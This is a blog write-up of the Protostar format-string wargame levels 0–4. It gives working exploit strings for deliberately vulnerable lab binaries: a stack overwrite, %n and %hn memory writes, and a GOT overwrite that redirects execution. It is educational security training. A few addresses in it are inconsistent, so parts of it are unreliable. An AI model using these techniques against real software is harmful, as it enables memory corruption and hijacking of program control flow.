---
title: "Protostar - Format String"
description: "Writeup for Protostar Format String"
pubDate: "March 09 2025"
image: /image/blog-cover/format.jpg
categories:
  - tech
tags:
  - Pwnable
  - Wargame
---

Protostar's format string challenges are amazing! I spent hours messing around to really get how they work. In this blog, I'll share my approach, some cool tricks, and a few things that might help you out. Hope you have fun reading it! ヾ(≧▽≦*)o

## Format 0

Description:

>This level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.
><br><br>Hints:<br>
>This level should be done in less than 10 bytes of input.<br>
>“Exploiting format string vulnerabilities”<br><br>
>This level is at /opt/protostar/bin/format0

Source code:

``` c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

Looking at the source code, we can see that it takes a command line argument and passes it to the **vuln()** function. Inside this function, the target variable is initially set to 0, and if we can change it to ***"0xdeadbeef"***, we complete the level.

Before solving the challenge, let’s take a look at how the stack is structured when we execute the binary:

```shell
|      .....      |  <--------- Higher address
|-----------------|
|       EBP       | 
|-----------------|
|      target     |  
|-----------------|
|      buffer     | 
|-----------------|
|      .....      |  <--------- Lower address
|-----------------|
```

### Vulnerability

From this stack layout, we can see that the vulnerability comes from <a href="https://cplusplus.com/reference/cstdio/sprintf/" target="_blank">sprintf()</a>, where we can overwrite the **target** variable through **buffer**. 

The call to **sprintf()** is vulnerable to a buffer overflow because it doesn’t check the size of our input. Additionally, it’s also vulnerable to a format string vulnerability since it doesn’t handle format specifiers like <a href="https://cplusplus.com/reference/cstdio/printf/" target="_blank">printf()</a> does.

### Buffer Overflow Solution

Since we are provided the source, we can easily see that **target** and **buffer** are located next to each other. This means we can exploit the program by filling the 64-byte buffer with 'A's and then overwriting target with ***"0xdeadbeef"*** in little-edian format.

Here is my exploit using Buffer Overflow:

```shell
user@protostar:/opt/protostar/bin$ ./format0 $(python -c 'print "A" * 64 + "\xef\xbe\xad\xde"')
you have hit the target correctly :)
```

However, our input exceeds 10 bytes, and we haven’t even used the Format String Vulnerability yet. Fortunately, we can use a clever trick involving the <a href="https://en.wikipedia.org/wiki/Printf#Width_field" target="_blank">width field</a> in format strings to get around this limitation and complete this level efficiently!

### Understanding the Format String Solution

When working with format strings, we can use special format specifiers like `%x`, `%d`, or `%s` to print values in different ways. But more importantly, we can specify a **width field** to control how many characters are printed. This is where `%64x` comes into play.

- The `%64x` specifier tells **printf** to print a hexadecimal number with a minimum width of 64 characters.
- Instead of manually entering 64 bytes of padding, `%64x` does it for us.
- This trick ***reduces the number of input characters*** we need to provide while still reaching the required byte length (less than 10 bytes of input).

With the help of `%64x`, we can write 64 bytes of padding without manually typing them out. 

Here is how the final exploit looks:

``` shell
user@protostar:/opt/protostar/bin$ ./format0 $(python -c 'print "%64x\xef\xbe\xad\xde"')
you have hit the target correctly :)
```

## Format 1

Description:

>This level shows how format strings can be used to modify arbitrary memory locations.
><br><br>Hints:<br>
>objdump -t is your friend, and your input string lies far up the stack :)<br><br>
>This level is at /opt/protostar/bin/format1

Source code:

``` c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

The goal here is to change the **target** variable from 0 to a nonzero value so that the program prints the success message.

### Vulnerability

At first glance, the code might seem normal, but there's a mistake in how `printf()` is used inside the `vuln()` function. Typically, **printf()** expects a format string followed by additional arguments if needed:

``` c
printf("%s", string);
```

but the code instead passes **our input** as format string:

``` c
printf(string);
```

This makes the program vulnerable because it allows us to include format specifiers (%x, %d, %s, %n, etc) in our input. Those format specifiers let us ***read or write to the stack***, which means we can overwrite the **target** variable to get our success message printed.

### Exploit

So, our approach for this is to write the address of `target` on to the stack, and use the format specifier `%n` to overwrite its value!

Let's start with finding the location of our input in the stack. Since the hint says that ***input string lies far up the stack***, I will create a big dump of stack memory, with some recognizable data (AAAAAAAA):

```shell
./format1 $(python -c 'print "AAAAAAAA" + ".%x" * 200')
```

You will see a big chunk of memory has been dumped. Now, we just need to adjust the difference, and find where our input appears in the stack. And in my case, the input starts at the position **129** in the stack slot.

``` shell
(...).41414100
```

However, we don't get the perfect data of `41414141`. So, how can we write our address to that location when the data is not perfectly aligned?

The answer to this is to use a technique called **Direct Parameter Access (DPA)**. This technique in format string exploits means placing an address at a specific location on the stack and using **%n$specifier** to refer to it. 

This is the syntax of DPA:

```
[address][padding]%[n]$specifier
```

- [address] → The memory location we want to write to 
- [padding] → The number of bytes we print to reach the desired value
- %[n]$specifier → Uses the nth stack entry to write data

Before we apply **DPA**, we need to find the memory address of **target**:

``` shell
user@protostar:/opt/protostar/bin$ objdump -t ./format1 | grep "target"
08049638 g     O .bss   00000004              target
```

Since our input starts at stack position **129**, we can use **DPA** to refer to this position. First, let’s verify we can reference the correct stack entry by using `%p` (which prints memory addresses):

``` shell
user@protostar:/opt/protostar/bin$ ./format1 $(python -c 'print "\x38\x96\x04\x08" + "%129$p"')
80x96380031
```

Something is off. We aren’t referencing the correct address...

The issue here is **alignment**. To fix this, we pad "00", and we got the correct address:

``` shell
user@protostar:/opt/protostar/bin$ ./format1 $(python -c 'print "\x38\x96\x04\x08" + "00%129$p"')
8000x8049638
```

Nice~ We are refenrencing the correct address. When we write to that address using `%n`, we will get the success message printed:

``` shell
user@protostar:/opt/protostar/bin$ ./format1 $(python -c 'print "\x38\x96\x04\x08" + "00%129$n"')
800you have modified the target :)
```

## Format 2

Description:

>This level moves on from format1 and shows how specific values can be written in memory.<br>
>This level is at /opt/protostar/bin/format2

Source code:

``` c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

Unlike **Format 1**, where our input came from the command line, this time it's read from `stdin`. This means we can’t pass our input as an argument, we need to use a pipe to redirect our input instead.

### Vulnerability

Once again, the program misuses `printf()`, making it vulnerable to a **Format String Attack**:

``` c
printf(buffer);
```

Instead, it should be written safely as:

```c
printf("%s", buffer)
```

Since the program doesn't use a proper format string, we can control how `printf()` works and use it to change the **target** variable. Our goal is to set **target** to 64 to beat this level.

### Exploit

First, we need to find where our input appears in the stack. To do this, we print a recognizable pattern (AAAA) followed by multiple format specifiers (%x) to inspect stack values:

``` shell
user@protostar:/opt/protostar/bin$ python -c 'print "AAAA" + ".%x" * 5' | ./format2
AAAA.200.b7fd8420.bffff614.41414141.2e78252e
```

Looking at the output, we can see our input AAAA appears in the 4th stack slot (41414141 is the hex representation of AAAA).

Now that we know the exact stack position of our input, we can place the address of **target** there and use ***Direct Parameter Access (DPA)*** to reference it.

Next, let's find the address of **target** by using `objdump`:

``` shell
user@protostar:/opt/protostar/bin$ objdump -t ./format2 | grep target
080496e4 g     O .bss   00000004              target
```

But before that, we have to make sure that we are referencing to the correct memory location using **DPA**:

```shell
user@protostar:/opt/protostar/bin$ python -c 'print "\xe4\x96\x04\x08" + "%4$p"' | ./format2
0x80496e4
target is 0 :(
```

Nice~ We are at the correct address. At the moment, we are printing 4 bytes (because of the address we placed), so **target is set to 4**. We can verify this by using `%n`, which writes the number of printed bytes into **target**:

``` shell
user@protostar:/opt/protostar/bin$ python -c 'print "\xe4\x96\x04\x08" + "%4$n"' | ./format2

target is 4 :(
```

Our assumption was correct! But how can we print additional 60 byte of data?

We can accomplish this by using ***width length*** like `%60x`, which tells printf to print 60 spaces.

Here is my updated exploit:

``` shell
user@protostar:/opt/protostar/bin$ python -c 'print "\xe4\x96\x04\x08" + "%60x%4$n"' | ./format2

you have modified the target :)
```

## Format 3

Description:

>This level advances from format2 and shows how to write more than 1 or 2 bytes of memory to the process. This also teaches you to carefully control what data is being written to the process memory.<br>
>This level is at /opt/protostar/bin/format3

Source code:

``` c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

The program is very similar to **Format 2**, but we now need to write 4 bytes into the target variable instead of just 1 byte.

Like before, we provide input via `stdin` and use a Format String Vulnerability to manipulate the value of **target**.

### Vulnerability

The program still misuses `printf()`, making it vulnerable to a **Format String Attack**. We can take advantage of this to overwrite the data in **target**.

At first glance, the solution for this level is much alike from **Format 2**. But it will be a little bit harder due to the limitation of `%n`, where we have to write 4 bytes of data.

This leads to ***2 possible solutions***:
- Overwriting each byte of target one by one (Four-Write Method).
- Writing 2 bytes at a time (Two-Write Method).

### Memory Representation

Before implementing solutions, let’s first visualize how **target** is stored in memory. This will make you understand the concept better!

Since **target** is a global variable, it is located in the `.bss` section. Let's find the address of **target** by using `objdump`:

``` shell
user@protostar:/opt/protostar/bin$ objdump -t ./format3 | grep target
080496f4 g     O .bss   00000004              target
```

We want to write "0x01025544" into that address. Here is the memory representation (remember the endianess):

```
 ------------------------------------------------
|   0x44    |    0x55    |   0x02    |    0x01    |
 -------------------------------------------------
  0x080486f4  0x080486f5   0x080486f6  0x080486f7
```

We will implement our solutions so that it will write data the exact same way above!

### Four-Write Method

As usual, we first determine where our input appears in the stack:

``` shell
user@protostar:/opt/protostar/bin$ python -c 'print "AAAA" + ".%x" * 14' | ./format3
AAAA.0.bffff5d0.b7fd7ff4.0.0.bffff7d8.804849d.bffff5d0.200.b7fd8420.bffff614.41414141.2e78252e.252e7825
target is 00000000 :(
```

Our input shows up at stack slot 12th. 

We also know that the address of **target** is at "0x080496f4".

Now is the real challenge, where we have to write 4 bytes of "0x01025544" into "0x080496f4". To achieve this, we need to write each byte separately at the corresponding memory locations: 0x080496**f4**, 0x080496**f5**, 0x080496**f6**, and 0x080496**f7**.

We place these addresses onto the stack and use ***Direct Parameter Access (DPA)*** to reference them correctly. Since our first address starts at **$12**, the other three addresses will be positioned at **$13**, **$14**, and finally **$15**.

So far, our exploit will look like this:

``` shell
python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08%12$n%13$n%14$n%15$n"' | ./format3

target is 10101010 :(
```

This looks good as we now have data written to each byte of `target`. Since we have printed 16 bytes (0x10 in hex), so each byte of `target` became **0x10**. Now, we have to calculated how many bytes we need to write with <a href="https://en.wikipedia.org/wiki/Printf#Width_field" target="_blank">width field</a> to get `target` equal to `0x01025544`.

We'll write the target value **byte by byte**, starting with the most significant byte (MSB) of target (0x080486f4), which needs to be `0x44 = 68`. Since we have already printed 16 bytes of data, we only need additonal 52 bytes of data. 

$$
68 - 16 = 52
$$

Then the next byte, `0x55 = 85`. The same logic still applies here!

$$
85 - 68 = 17
$$


However, at the next byte, we have to write `0x02`, which is smaller than `0x55 (85)`. How can we write `0x02` to the next byte?

The trick here is simple. We just need to provide a value which is greater than `0xff (255)`, and the extra bits will overflow to the next byte. In this case, I will choose `0x102 = 258`:

$$
258 - 85 = 173
$$

Here is a clearer picture why I choose `0x102`:

```
 -------------------------
|    0x02    |    0x01    |
 -------------------------
  0x080496f6   0x080496f7
```

Since `0x102` is greater than `0xff`, the byte `0x01` will overflow the address `0x080496f7`.

Here is my updated exploit:

``` shell
user@protostar:/opt/protostar/bin$ python -c 'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08\xf7\x96\x04\x08%52x%12$n%17x%13$n%173x%14$n"' | ./format3

you have modified the target :)
```

### Two-Write Method

This method reduces the number of writes to **two**, which is more efficient, as adjacent memory isn't prone to be corrupted. 

Instead of writing **one byte at a time**, we write **two bytes at a time** using `%hn`, which performs a half-word write (16 bits). This avoids overflow issues that occur when writing **byte-by-byte**.

We will overwrite target (0x080496f4) with 0x01025544 by splitting it into two half-word writes:

1. First half-word: 0x5544 &#8594; Written to 0x080496f4
2. Second half-word: 0x0102 &#8594; Written to 0x080496f6

Since each write covers two bytes, we only need to reference two stack slots (**$12** and **$13**) instead of four.

The trick here is that we should **start with smallest value first**, which is `0x0102`. Since we already have 8 bytes due to our memory addresses (**0x080496f4** and **0x080496f6**), the number of additional bytes we need to print for `0x080496f6` is:

$$
0x0102 - 8 = 250
$$

``` shell
user@protostar:/opt/protostar/bin$ python -c 'print "\xf6\x96\x04\x08\xf4\x96\x04\x08%250x%12$hn"' | ./format3

target is 01020000 :(
```

Nice~ We have successfully overwritten `0x0102`, now we just need to calculate the rest:

$$
0x5544 - 258 = 21570
$$

``` shell
user@protostar:/opt/protostar/bin$ python -c 'print "\xf6\x96\x04\x08\xf4\x96\x04\x08%250x%12$hn%21570x%13$hn"' | ./format3

you have modified the target :)
```

## Format 4

Description:

>format4 looks at one method of redirecting execution in a process.
><br><br> Hints:
>objdump -TR is your friend
><br><br>This level is at /opt/protostar/bin/format4

Source code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);  
}

int main(int argc, char **argv)
{
  vuln();
}
```

### Vulnerability

To beat this level, we just need to redirect our program execution to the **hello()** function. However, if you look at **vuln()** function carefully, you will notice that `exit(1)` forces our program to end and we are unable to redirect our program execution. 

So how can we redirect our program execution when the only thing we can exploit is **printf()**?

The answer lies in how dynamically linked functions work. `exit(1)` is a function from `libc`, which is a dynamic library linked to our program. Instead of calling `exit()` directly, the program looks up its address in the ***Global Offset Table (GOT)***, a table that holds addresses of functions from dynamically linked library, like functions from `libc`. The entry for `exit` in the **GOT** initially stores the actual address of `exit` inside `libc`, so when the program calls `exit()`, it first dereferences this **GOT entry** and jumps to the address stored there.

However, before the address of `exit()` is placed in the **GOT**, the program first goes through another mechanism called the ***Procedure Linkage Table (PLT)***. The PLT is a mechanism that helps resolve function addresses at runtime. When a dynamically linked function like `exit()` is called for the first time, execution first jumps to its corresponding **PLT entry**, which then checks **the GOT entry**.

- If **the GOT entry** is empty (not yet resolved), **the PLT** calls the dynamic linker (`ld.so`), which finds the actual address of `exit()` in `libc` and updates **the GOT entry** with this address.
- If **the GOT entry** is already filled, the function is called directly from **the GOT** without needing **the PLT** again.

We can exploit this by using **printf()** to overwrite the GOT entry for `exit`, replacing its stored address with the address of our **hello()** function. That way, when `exit()` is called, the program will execute `hello()` instead, successfully redirecting the program execution.

### Exploit

As usual, we first need to find the location of our input in the stack:

```shell
user@protostar:/opt/protostar/bin$ python -c 'print "AAAA" + ".%x" * 5' | ./format4
AAAA.200.b7fd8420.bffff614.41414141.2e78252e
```

So, our input starts at the 4th location in the stack.

Next, we will use `objdump` to find the addresses of **hello()**:

``` shell
user@protostar:/opt/protostar/bin$ objdump -t ./format4 | grep hello
080484b4 g     F .text  0000001e              hello
```

Remember that we first go to **the PLT entry**, then we can get access to **the GOT entry**. So, our goal is simple: find **the PLT entry**, disassemble it, and from there, we'll get **the GOT entry**.

```shell
user@protostar:/opt/protostar/bin$ gdb ./format3
(gdb) set disassembly-flavor intel
(gdb) set pagination off
(gdb) disassemble vuln
...
0x080484c9 <vuln+98>:   call   0x804837c <printf@plt>
0x080484ce <vuln+103>:  leave
0x080484cf <vuln+104>:  ret
End of assembler dump.
```

So, `printf()` is being called through its **PLT stub** at `0x0804837c`. Let's disassemble it to see what's inside:

```shell
(gdb) disassemble 0x804837c
Dump of assembler code for function printf@plt:
0x0804837c <printf@plt+0>:      jmp    DWORD PTR ds:0x80496d8
0x08048382 <printf@plt+6>:      push   0x18
0x08048387 <printf@plt+11>:     jmp    0x804833c
End of assembler dump.
```

The first instruction jumps to the address stored at `0x80496d8`, which means that's our **GOT entry** for `printf`. Let's examine it:

```shell
(gdb) x 0x80496d8
0x80496d8 <_GLOBAL_OFFSET_TABLE_+24>:   0x08048382
```

Right now, it points back into **the PLT section**, which is normal because of how dynamic linking works. Our goal is just overwritten `0x80496d8` **(GOT)** with the address of **hello()**, which is `0x80484b4`.

Now, we can again use **Direct Parameter Access (DPA)**, and short-write to overwrite the address in **exit()** to address of **hello()**.

Follow the tip in **Two-Write Method** in **Format 3**, we will choose the smallest value first. In this case is `0x0804`. We already have 8 bytes written from 2 addresses, here is the number of bytes needed for our **width length**: 

$$
0x0804 - 8 = 2044
$$

Next, we need to write `0x84b4 = 33972`:

$$
0x84b4 - 2052 = 31920
$$

Here is the exploit:

``` shell
user@protostar:/opt/protostar/bin$ python -c 'print "\x24\x97\x04\x08\x26\x97\x04\x08" + "%2044x%5$hn%31920x%4$hn"' | ./format4

code execution redirected! you win
```

### Optimization

Since the address of `exit()` function stays in ***GOT***, where it is unchanged throughout the program. This means the address of `exit()` always starts with `0x0804`, and writing it again is redundant.

So, we can jump directly to the last part of our write, which is `0x84b4 = 33972`:

$$
33972 - 4 = 33968
$$

Let's rebuild our exploit:

``` shell
user@protostar:/opt/protostar/bin$ python -c 'print "\x24\x97\x04\x08" + "%33968x%4$hn"' | ./format4

code execution redirected! you win
```
